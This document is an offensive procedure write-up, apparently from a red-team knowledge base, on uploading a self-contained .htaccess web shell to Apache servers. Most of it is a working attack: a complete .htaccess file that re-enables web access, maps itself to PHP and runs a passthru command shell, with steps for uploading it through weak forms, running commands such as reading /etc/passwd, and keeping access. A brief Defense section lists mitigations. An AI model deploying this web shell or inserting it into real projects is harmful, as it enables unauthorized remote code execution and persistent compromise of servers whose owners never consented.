---
type: procedure
tactics:
  - '[[Execution]]'
  - '[[Persistence]]'
techniques:
  - '[[Web Shell]]'
sub_techniques: []
tags:
  - .htaccess-upload
  - web-shell
  - php-shell
commands: []
platforms:
  - Web
  - Apache
tools: []
skill_level: intermediate
impact_level: high
detection_risk: medium
verified: true
validated: true
---

# HTAccess and PHP Shell Upload

## Summary

This procedure demonstrates how to upload a malicious .htaccess file to an Apache web server to enable execution of PHP code within the .htaccess file itself, effectively deploying a web shell for remote command execution. It exploits misconfigurations allowing .htaccess uploads and PHP interpretation, providing persistence and execution capabilities on the target server.

## Description

The HTAccess and PHP Shell Upload technique targets Apache web servers vulnerable to file upload restrictions that permit .htaccess files. By uploading a specially crafted .htaccess file containing Apache directives followed by PHP code, the attacker overrides default access rules to make the file web-accessible and forces Apache to interpret it as a PHP script. This allows arbitrary command execution via HTTP requests, enabling post-exploitation activities like data exfiltration or lateral movement. The attack requires an upload vector, such as a vulnerable file upload form, and assumes PHP is enabled on the server. Success grants remote code execution (RCE) without needing additional files, reducing detection footprint. This is commonly used in web application compromises for maintaining access.

## Requirements

1. Access to a file upload functionality on the target Apache web server that allows .htaccess files (e.g., via a vulnerable web form without proper validation).
2. PHP execution enabled on the server.
3. Knowledge of the upload directory path where the .htaccess will be placed to affect intended subdirectories.
4. A web browser or tool like curl for uploading and accessing the shell.

## Defense

Defensive measures and detection strategies:

- Disable .htaccess overrides in Apache configuration (AllowOverride None) and block .htaccess uploads via web application firewalls (WAF).
- Implement strict file upload validation: reject files with .htaccess extension, scan uploads for malicious content, and store them outside the web root.
- Monitor web server logs for suspicious uploads, unusual PHP executions in non-PHP files, and anomalous HTTP requests with command parameters (e.g., ?c=).
- Enable mod_security or similar to detect and block PHP code in .htaccess files; regularly audit file permissions and server configurations.

## Objectives

1. Upload a self-contained .htaccess web shell to the target server.
2. Achieve remote command execution via the web shell.
3. Establish persistence for ongoing access to the compromised server.

## Instructions

### Step 1: Prepare the Malicious .htaccess File

**Context**: Create a self-contained .htaccess file that includes directives to make it accessible and interpretable as PHP, followed by the web shell code. This exploits Apache's processing order: directives are applied first, then the file is executed as PHP.

Embed the following .htaccess configuration and PHP shell code into a single file named ".htaccess".

**Code** ([[codes/HTAccess-Self-Contained-Web-Shell]]):

```htaccess
# Self contained .htaccess web shell - Part of the htshell project
# Written by Wireghoul - http://www.justanotherhacker.com

# Override default deny rule to make .htaccess file accessible over web
<Files ~ "^\.ht">
Order allow,deny
Allow from all
</Files>

# Make .htaccess file be interpreted as php file. This occur after apache has interpreted
# the apache directoves from the .htaccess file
AddType application/x-httpd-php .htaccess

###### SHELL ######
<?php echo "\n";passthru($_GET['c']." 2>&1"); ?>
```

> This combines the access override, PHP type addition, and the passthru shell. Save this as .htaccess. The PHP code executes commands passed via the 'c' query parameter, redirecting stderr to stdout for full output visibility.

### Step 2: Upload the .htaccess File to the Target Server

**Context**: Use the vulnerable upload mechanism to place the .htaccess file in the target directory or subdirectory where execution is desired. Ensure the upload path allows .htaccess processing (e.g., not blocked by .htaccess deny rules elsewhere).

Navigate to the file upload form on the target web application. Select the prepared .htaccess file and submit the upload. If the upload is via HTTP POST, you can use a browser or intercept with a proxy like Burp Suite to bypass any client-side checks.

> Verify the upload by checking the server's response or accessing the upload directory listing if available. The file must land in a directory where Apache processes .htaccess files.

### Step 3: Access and Execute Commands via the Web Shell

**Context**: Once uploaded, access the .htaccess file directly via its URL to trigger PHP execution. Append commands to the 'c' parameter to run shell commands on the server.

Construct the URL to the uploaded .htaccess file and add ?c= followed by the desired command (URL-encoded if necessary).

For example, to list directory contents:

```
https://target-domain.com/path/to/upload/.htaccess?c=ls
```

> The server will execute the command and return the output in the HTTP response body. Test with simple commands like 'id' or 'whoami' to confirm RCE. Use URL encoding for special characters (e.g., %20 for spaces).

### Step 4: Verify and Maintain Access

**Context**: Confirm shell functionality and use it for further exploitation while monitoring for detection.

Execute verification commands such as 'uname -a' or 'cat /etc/passwd' via the URL parameter. Document the shell URL for persistence.

> Success is indicated by command output in the response. If output is truncated, chain commands with && or ;. Rotate access if logs show anomalies.
